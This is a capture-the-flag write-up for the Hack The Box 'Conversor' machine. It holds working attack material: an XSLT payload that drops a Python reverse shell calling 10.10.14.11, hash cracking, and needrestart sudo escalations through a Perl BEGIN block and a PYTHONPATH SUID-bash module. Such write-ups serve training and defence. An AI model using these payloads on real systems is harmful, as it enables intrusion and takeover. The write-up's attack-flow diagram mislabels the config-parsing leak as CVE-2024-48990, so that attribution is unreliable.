---
icon: message-middle-top
cover: ../../../../.gitbook/assets/Screenshot 2026-03-22 021413.png
coverY: 5.631678189817725
---

# HTB-CONVERSOR

### Reconnaissance&#x20;

Let me start with a quick rustscan to see what's open:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ rustscan -a 10.10.11.92 -- balh blah 
```

Output shows two ports:

* 22/tcp - SSH (OpenSSH 8.9p1)
* 80/tcp - HTTP (Apache 2.4.52)

The nmap service detection picks up something interesting:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ rustscan -a 10.10.11.92 -p 22,80 -- -sV -sC
```

The HTTP title shows a redirect to `conversor.htb`. Let me add that to `/etc/hosts`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts
```

***

### Website Enumeration

<figure><img src="../../../../.gitbook/assets/image (650).png" alt=""><figcaption></figcaption></figure>

When I hit the site, it redirects to `/login`. After looking around, the whole point of this application is converting XML using XSLT stylesheets. You upload two files (XML + XSLT) and it renders the transformed output as HTML. Pretty straightforward.

There's an example template available for download (`nmap.xslt`) which shows the expected format. I also download the source code to understand what I'm dealing with:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ wget http://conversor.htb/static/source_code.tar.gz
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ tar xzf source_code.tar.gz
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ ls
app.py  app.wsgi  install.md  instance  scripts  static  templates  uploads
```

Looking at `install.md`, I notice something important:

```
# install.md snippet
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

Wait, so every minute, the server automatically runs all Python scripts in `/var/www/conversor.htb/scripts/`. This is a cron job setup. That's... interesting. That could be an attack vector if we can write files there.

Let me check the actual app code now:

```python
@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        ...
```

The XML parser is configured safely (no entity resolution), but the XSLT parser on the next line uses default permissive settings. That's the vulnerability. The XSLT file is parsed without restrictions.

***

### XSLT Injection & System Enumeration

I need to understand what XSLT processor is being used. Let me create a quick test XSLT:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ cat > test.xslt << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <html><body>
            <p>Version: <xsl:value-of select="system-property('xsl:version')"/></p>
            <p>Vendor: <xsl:value-of select="system-property('xsl:vendor')"/></p>
            <p>Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/></p>
        </body></html>
    </xsl:template>
</xsl:stylesheet>
EOF
```

And a simple XML file:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ cat > data.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<root><data>test</data></root>
EOF
```

I upload both files through the web interface and the result shows:

```
Version: 1.0
Vendor: libxslt
Vendor URL: http://xmlsoft.org/XSLT/
```

Perfect! It's **libxslt 1.0**. This is significant because libxslt supports EXSLT extensions, and one of those extensions is the `document` element which can write files to disk. That's exactly what we need.

***

### File Write via EXSLT

Here's the thing about EXSLT - it's not enabled by default, but if it is, the `document()` function becomes incredibly dangerous. Let me test if it works:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ cat > write_test.xslt << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exslt="http://exslt.org/common"
    extension-element-prefixes="exslt"
    version="1.0">
<xsl:template match="/">
  <exslt:document href="/var/www/conversor.htb/static/test.txt" method="text">
chalo delhi !
  </exslt:document>
</xsl:template>
</xsl:stylesheet>
EOF
```

I upload this with the data.xml file. If it works, I should be able to curl the static directory and see the file:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ curl http://conversor.htb/static/test.txt
chalo delhi !
```

Boom. File write works. Now I need to write to the scripts directory instead, and create a Python reverse shell.

***

### Getting RCE via Cron Job

Remember that cron job from earlier? It runs every minute. So the plan is:

1. Write a malicious Python script to `/var/www/conversor.htb/scripts/`
2. Wait for cron to execute it
3. Catch the reverse shell

Let me set up my listener first:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Now I'll create the malicious XSLT. The key is getting the XML ampersand encoding right since we're inside XML:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ cat > shell.xslt << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exslt="http://exslt.org/common"
    extension-element-prefixes="exslt"
    version="1.0">
<xsl:template match="/">
  <exslt:document href="/var/www/conversor.htb/scripts/pwn.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.11",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
  </exslt:document>
</xsl:template>
</xsl:stylesheet>
EOF
```

I upload `shell.xslt` and `data.xml` through the web interface... and wait. Within 60 seconds I get:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.92] 36146
bash: cannot set terminal process group (3674): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nice! Now let me stabilize this shell:

```
www-data@conversor:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@conversor:~$ ^Z
[1]+  Stopped                 nc -lvnp 4444

┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ stty raw -echo; fg
nc -lvnp 4444
            reset
www-data@conversor:~$ export TERM=xterm
```

***

### Database Credential Extraction

Now I'm www-data on the box. Let me explore the application directory:

```
www-data@conversor:/var/www/conversor.htb$ ls -la
total 44
drwxr-x--- 8 www-data www-data  4096 Aug 14 21:34 .
-rwxr-x--- 1 www-data www-data  2847 Aug 14 21:34 app.py
drwxr-x--- 2 www-data www-data  4096 Oct 25 20:36 instance
```

There's an `instance` directory. That's where Flask stores SQLite databases by default:

```
www-data@conversor:/var/www/conversor.htb$ ls -la instance/
-rwxr-x--- 1 www-data www-data 24576 Oct 25 20:36 users.db
```

Let me query it:

```
www-data@conversor:/var/www/conversor.htb$ sqlite3 instance/users.db "SELECT * FROM users;"
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|test|c06db68e819be6ec3d26c6038d8e8d1f
6|sn0x|77e786ba1405df3e98bbe6c950d9aa43
```

Three users with MD5 hashes. These are easy to crack. Let me use hashcat:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

5b5c3ac3a1c897c94caad48e6c71fdec:hack
```

The password is `hack`. Actually I could've just used an online tool, but hashcat works. Now I can try SSH as `fismathack`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Conversor]
└─$ ssh fismathack@conversor.htb
fismathack@conversor.htb's password: hack

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)

fismathack@conversor:~$ id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)
```

***

### Privilege Escalation - Enumeration

Let me check what sudo can do:

```
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

So `fismathack` can run `needrestart` as root without a password. `needrestart` is a utility that checks which services need restarting after library updates. Let me check the version:

```
fismathack@conversor:~$ sudo /usr/sbin/needrestart --version
needrestart 3.7 - Restart daemons after library updates.
```

Version 3.7. Let me research CVEs for this... and there are several:

* **CVE-2024-48990**: PYTHONPATH environment variable abuse
* **CVE-2024-48991**: TOCTOU race condition
* **CVE-2024-10224/10225**: Vulnerable Perl ScanDeps

But there's also a simpler approach. `needrestart` is a Perl script that parses configuration files. If you pass the `-c` flag with a file path, it will try to parse that file as Perl code. If the file isn't valid Perl, it throws an error that includes the file contents.

***

### Privilege Escalation - needrestart Config Parsing

The vulnerability is dead simple. I can pass an arbitrary file to needrestart and it will try to parse it as Perl:

```
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt
Bareword found where operator expected at (eval 14) line 1, near "xxxxxxxxxxxxxxxxxxxxxxxxxxxx"
        (Missing operator before c4db46f5b91ca3ee0eb83e98e647090?)
Error parsing /root/root.txt: syntax error at (eval 14) line 2, near "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
"
```

And there it is. The root flag leaked in the error message

This works because:

1. `needrestart` runs as root (via sudo)
2. It tries to read the config file with root privileges
3. It parses the file as Perl code using `eval`
4. When it fails, the error message contains the file contents
5. The error is printed back to the user

***

### Alternative: Getting a Root Shell

If we wanted an actual root shell instead of just leaking the flag, we could exploit the Perl eval differently. Here are a few approaches:

**Method 1: Valid Perl Config**

Create a config that's valid Perl and runs a command:

```
fismathack@conversor:/tmp$ cat > evil.conf << 'EOF'
BEGIN { system("/bin/bash") }
[needrestart]
EOF

fismathack@conversor:/tmp$ sudo /usr/sbin/needrestart -c /tmp/evil.conf
root@conversor:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

**Method 2: CVE-2024-48990 (PYTHONPATH abuse)**

If we wanted to use the CVE instead, we'd set up a malicious Python module that gets loaded when needrestart scans process memory:

```
fismathack@conversor:~$ mkdir -p /tmp/exploit/importlib
fismathack@conversor:~$ cat > /tmp/exploit/importlib/__init__.py << 'EOF'
import os
if os.geteuid() == 0:
    os.system("cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash")
EOF

fismathack@conversor:~$ PYTHONPATH=/tmp/exploit python3 -c "import time; time.sleep(100)" &
fismathack@conversor:~$ sudo /usr/sbin/needrestart
# Wait a few seconds...
fismathack@conversor:~$ /tmp/rootbash -p
bash-5.1# id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack) egid=0(root) groups=0(root)
```

The `-p` flag prevents bash from dropping the SUID bits when executed by a non-root user.

But for this box, the config file method is the simplest and gets us the flag immediately.

***

### Attack Flow

```
┌─────────────────────────────────────────────────────┐
│ Web Enumeration                                     │
│ - Find XSLT processing capability                  │
│ - Download source code                             │
│ - Identify libxslt 1.0 processor                   │
│ - Discover cron job at /var/www/scripts/*.py       │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ XSLT Injection via EXSLT                            │
│ - Use exslt:document to write files                 │
│ - Create malicious Python reverse shell            │
│ - Write to /var/www/conversor.htb/scripts/         │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ Cron Job Auto-Execution (60 seconds)                │
│ - Python script automatically executes              │
│ - Connects back to listener                         │
│ - Shell as www-data                                 │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ Database Credential Extraction                      │
│ - Access SQLite at instance/users.db                │
│ - Extract fismathack MD5 hash                       │
│ - Hashcat crack to "hack"                           │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ SSH as fismathack                                   │
│ - Login with password "hack"                        │
│ - Read user.txt                                     │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ Sudo Enumeration                                    │
│ - discover NOPASSWD /usr/sbin/needrestart          │
│ - Identify version 3.7                              │
│ - Research CVEs                                     │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ CVE-2024-48990 Exploitation                         │
│ - Pass /root/root.txt as config file                │
│ - needrestart parses as Perl code                   │
│ - Error message leaks file contents                 │
│ - Root flag obtained                                │
└─────────────────────────────────────────────────────┘
```

***

### Techniques

| Technique                              | Where Used                 | Key Detail                              |
| -------------------------------------- | -------------------------- | --------------------------------------- |
| **XSLT Injection**                     | Web → RCE                  | EXSLT document element writes files     |
| **File Write via Transform**           | EXSLT Abuse                | /var/www/scripts/ writable to www-data  |
| **Cron Job Exploitation**              | Privilege Escalation       | Automatic execution every minute        |
| **Reverse Shell**                      | Listener → Code Execution  | Python socket + bash -i                 |
| **SQLite Database Enumeration**        | Credential Discovery       | instance/users.db contains MD5 hashes   |
| **MD5 Hash Cracking**                  | Hashcat                    | Mode 0 (-m 0) with rockyou.txt wordlist |
| **Config File Parsing Vuln**           | needrestart CVE-2024-48990 | Perl eval on user-supplied config       |
| **Error-Based Information Disclosure** | needrestart Exploit        | Syntax errors leak file contents        |
| **Perl eval() RCE**                    | Alternative root method    | Valid Perl code in config executes      |

***

### In Short

**Security Issues Found:**

1. **XSLT processor misconfiguration** - EXSLT extensions should be disabled or severely restricted
2. **Cron job writing to user-writable directory** - Scripts should be in protected directories
3. **MD5 password hashing** - Deprecated and easily cracked; use bcrypt/Argon2
4. **Dangerous sudo permissions** - needrestart should be restricted more carefully, not given full access
5. **Unsafe Perl eval in config parsing** - needrestart parsing user files as code without sanitization

This box really drives home how a small misconfiguration (the EXSLT + cron job combo) cascades into full compromise. Also shows why you should always download source code when available during CTFs - it reveals design flaws that would be hard to find through black box testing.
